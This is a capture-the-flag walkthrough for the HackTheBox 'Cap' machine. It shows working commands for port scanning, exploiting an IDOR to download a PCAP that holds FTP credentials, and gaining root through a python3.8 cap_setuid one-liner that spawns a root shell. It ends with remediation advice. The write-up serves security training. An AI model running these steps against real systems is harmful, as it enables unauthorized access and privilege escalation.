# HackTheBox: Cap - Full Walkthrough

**Machine:** Cap  
**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.129.16.175  
**Date:** March 29, 2026

---

## Overview

Cap is an Easy-rated Linux machine that demonstrates:
1. **IDOR vulnerability** in a web application
2. **Plaintext credential exposure** in network captures
3. **Linux capabilities misconfiguration** for privilege escalation

---

## Reconnaissance

### Port Scanning

```bash
nmap -sS -sV -sC -p- --min-rate 1000 10.129.16.175
```

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
```

### Web Application Analysis

The web server runs a "Security Dashboard" with the following features:
- **Dashboard** (`/`) - Main page with security metrics
- **Security Snapshot** (`/capture`) - Generates 5-second PCAP captures
- **IP Config** (`/ip`) - Displays network interface information
- **Network Status** (`/netstat`) - Shows network connections

The application is built with Python (Gunicorn server) and appears to execute system commands to gather network information.

---

## Exploitation

### Step 1: Discovering the IDOR Vulnerability

The `/capture` endpoint redirects to `/data/X` where X is an incrementing counter. Testing revealed:

```bash
# Accessing different capture IDs
curl http://10.129.16.175/data/0  # HTTP 200 - Valid
curl http://10.129.16.175/data/1  # HTTP 200 - Valid
curl http://10.129.16.175/data/2  # HTTP 404 - Not found
```

The `/download/X` endpoint allows downloading the raw PCAP files.

### Step 2: Analyzing Captured Traffic

Downloaded the existing capture file:

```bash
curl http://10.129.16.175/download/0 -o capture_0.pcap
```

Analyzed with tshark:

```bash
tshark -r capture_0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

**Critical Finding:**
```
USER	nathan
PASS	REDACTED
230	Login successful.
```

The PCAP file contained Nathan's FTP credentials in plaintext!

### Step 3: Initial Access

Tested credentials via FTP and SSH:

```bash
# FTP Access
ftp nathan@10.129.16.175
Password: REDACTED

# SSH Access
ssh nathan@10.129.16.175
Password: REDACTED
```

Both worked successfully.

### Step 4: User Flag

```bash
nathan@cap:~$ cat user.txt
REDACTED
```

---

## Privilege Escalation

### Step 1: System Enumeration

Checked for privilege escalation vectors:

```bash
# Check for capabilities
getcap -r / 2>/dev/null
```

**Finding:**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Python 3.8 has the `cap_setuid` capability, which allows a process to set its user ID!

### Step 2: Exploiting cap_setuid

Used Python to escalate to root:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

### Step 3: Root Flag

```bash
root@cap:~# cat /root/root.txt
REDACTED
```

---

## Technical Details

### IDOR Vulnerability Explanation

The application stores PCAP captures with sequential numeric IDs without proper access controls. Any user can access any capture by modifying the ID parameter, allowing access to captures created by other users or the system.

**Impact:** Unauthorized access to potentially sensitive network traffic data.

### Linux Capabilities Explanation

Linux capabilities are fine-grained privileges that can be assigned to executables. The `cap_setuid` capability allows a binary to change its effective user ID, regardless of the calling user's permissions.

When assigned to Python, this allows any user to execute arbitrary code with root privileges:

```python
import os
os.setuid(0)  # Become root
os.system("/bin/bash")  # Execute shell as root
```

---

## Remediation Recommendations

### 1. Fix IDOR Vulnerability
- Implement proper session-based access control
- Use random, non-guessable identifiers for capture files
- Validate user ownership before serving files

### 2. Secure Network Captures
- Never capture credentials in plaintext (FTP should use FTPS/SFTP)
- Encrypt sensitive traffic
- Automatically purge old captures

### 3. Remove Dangerous Capabilities
```bash
sudo setcap -r /usr/bin/python3.8
```
Or restrict capability usage to specific trusted users.

---

## Attack Chain Summary

```
┌─────────────────┐
│  Port Scan      │ 21 (FTP), 22 (SSH), 80 (HTTP)
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Web Enum       │ Security Dashboard with PCAP capture
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  IDOR Exploit   │ Access /download/0 (pre-existing capture)
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Credential     │ nathan:REDACTED in PCAP
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  SSH Access     │ Login as nathan, get user flag
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  PrivEsc Enum   │ python3.8 has cap_setuid
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Root Exploit   │ python3.8 -c 'os.setuid(0)'
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  ROOT ACCESS    │ Root flag captured
└─────────────────┘
```

---

## Flags

- **User:** `REDACTED`
- **Root:** `REDACTED`

---

## Lessons Learned

1. **Always check for IDOR vulnerabilities** - Sequential IDs are a red flag
2. **Analyze all available data** - PCAP files can contain sensitive information
3. **Check Linux capabilities** - Often overlooked but powerful privesc vector
4. **Python with capabilities is dangerous** - Can be used to spawn privileged shells
